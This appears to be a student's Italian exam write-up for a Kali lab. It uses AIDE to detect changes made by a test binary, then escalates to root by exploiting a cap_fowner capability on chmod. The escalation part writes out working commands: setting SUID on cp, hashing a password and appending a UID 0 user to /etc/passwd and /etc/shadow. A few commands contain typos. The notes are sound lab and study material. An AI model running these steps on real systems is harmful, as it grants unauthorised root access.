@@ -1,0 +1,166 @@
+## esame 8 febbraio 24 AIDE e PRIVESC
+conPASSWORD
+
+---Obbiettivo:
+
+Scaricare sulla VM Kali il file change5 e renderlo eseguibile
+$ chmod +x ./change5
+Il comando apporta modifiche a file dentro /usr/bin e /etc
+
+usate come utente kali senza sudo il/i file modificato/i dal comando change5 che ritenete utili per inserire nei file in /etc/passwd ed /etc/shadow le righe opportune per "creare" un utente di nome toor con privilegi di root e password gotRoot
+----------------------
+
+#### FASE 1 ######
+
+1) creo una cartella con la mia configurazione
+
+--# mkdir /home/kali/aide
+--# cd /home/kali/aide
+--# nano aide.conf
+-------------------------///////
+# Databases Path
+
+database=file:/home/kali/aide/aide.db
+database_out=file:/home/kali/aide/aide.db.new
+database_new=file:/home/kali/aide/aide.db.new
+
+# Set your own AIDE rule
+
+RULE=R+rmd160+sha256
+
+# Direc/files to monitor with rules
+
+/usr/bin RULE
+/etc RULE
+
+# Dir to ignore
+!/bin
+!/boot
+!/dev
+!/home
+!/lib
+!/lib64
+!/media
+!/mnt
+!/opt
+!/proc
+!/root
+!/run
+!/sbin
+!/srv
+!/sys
+!/tmp
+!/var
+-------------------------///////
+
+
+2) reinizializzo il database con la nuova configurazione
+
+--# sudo aide -c /home/kali/aide/aide.conf -i
+--# cp /home/kali/aide/aide.db{.new,}
+
+3) lancio il comando e poi il confronto con aide
+--# sudo ./change5
+--# sudo aide -c /home/kali/aide/aide.conf -C
+
+4) controllo i cambiamenti:
+
+---------------------------------------------------
+Detailed information about changes:
+---------------------------------------------------
+
+File: /etc/passwd
+ Ctime     : 2024-03-16 13:41:58 -0400        | 2024-06-06 03:56:13 -0400
+
+File: /etc/shadow
+ Perm      : -rw-r-----                       | -rw-------
+ Ctime     : 2024-03-16 13:43:03 -0400        | 2024-06-06 03:56:13 -0400
+ ACL       : A: user::rw-                     | A: user::rw-
+             A: group::r--                    | A: group::---
+             A: other::---                    | A: other::---
+
+File: /usr/bin/chmod
+ Ctime     : 2024-02-25 12:39:50 -0500        | 2024-06-06 03:56:13 -0400
+ XAttrs    : num=0                            | num=1
+                                              | [1] security.capability <=> AQAA
+                                              | AggAAAAAAAAAAAAAAAAAAAA=
+
+File: /usr/bin/tail
+ Ctime     : 2024-02-25 12:39:52 -0500        | 2024-06-06 03:56:13 -0400
+ XAttrs    : num=0                            | num=1
+                                              | [1] security.capability <=> AAAA
+                                              | AgAAAAAAAAAAAAAAAAAAAAA=
+
+
+---Cambiamenti su 
+
+/etc/passwd -> timestamp non ci interessa
+/etc/shadow -> permessi: tolto r a group
+/usr/bin/chmod -> capability
+/usr/bin/tail -> capability
+
+-------------------------
+
+Verifichiamo le capability:
+
+--# 	getcap /usr/bin/tail
+	/usr/bin/tail =
+
+--#	getcap /usr/bin/chmod
+	/usr/bin/chmod cap_fowner=ep
+ 
+Per chmod qualcosa è cambiato... cosa?
+
+--#	man capabilities
+--#	/CAP_FOWNER
+
+CAP_FOWNER
+              •  Bypass  permission  checks on operations that normally require the filesystem
+                 UID of the process to match the UID of the file
+
+
+##### FASE 2 #############
+
+Il risultato del controllo mostra come il file change5 abbia apportato delle modifiche 
+alle capabilities di chmod; in questo caso possiamo eseguire chmod anche su file che non sono 
+di nostra proprietà
+
+-Sfrutto chmod, setto SUID su cp anche se non sono il proprietario:
+
+	chmod +s /usr/bin/cp 
+
+-Per codificare la password "gotRoot":
+
+[codifico il salt]
+	openssl rand -base64 32
+
+[codifico la password con il salt]
+	openssl passwd -6 -salt mqn8xWt4j5pjMVxh66RmfPWQtLrrVphcI8aXI/iNzoY= gotRoot
+
+-uso il comando cp:
+	
+	mkdir /tmp
+
+	cp /etc/passwd /tmp/passwd
+	cp /ect/shadow /tmp/shadow
+
+[nota: di norma senza SUID servirebbe per questi file: sudo cp]
+
+	echo "toor:x:0:0::/root:/bin/bash" >> /tmp/passwd
+	
+	(se non va chmod g=+w /tmp/passwd)
+
+[nome:passwd:UID:GID:descrizione:DIR_HOME:shell]
+
+	echo "toor:$6$x3iPAIqrTKcZ+v8J$55zSAGBoh4nTIOjKyZ2r1mP..Shea7iBV2cBdtCT9GooS7Xh0FOhiTUaGUPebO0AqN7C/Ysl8dzihYCkp367L/:19509:0:99999:7:::" >> /tmp/shadow
+
+[nome:passwd:ultimoCambioPasswd:minimoGiorniCambioPasswd:gvaliditàPasswd:avvisioCambioPasswd:::]
+
+	cp /tmp/passwd /etc/passwd
+	cp /tmp/shadow /etc/shadow
+
+--------
+
+	sudo -i toor
+	[password:] gotRoot
+	# id
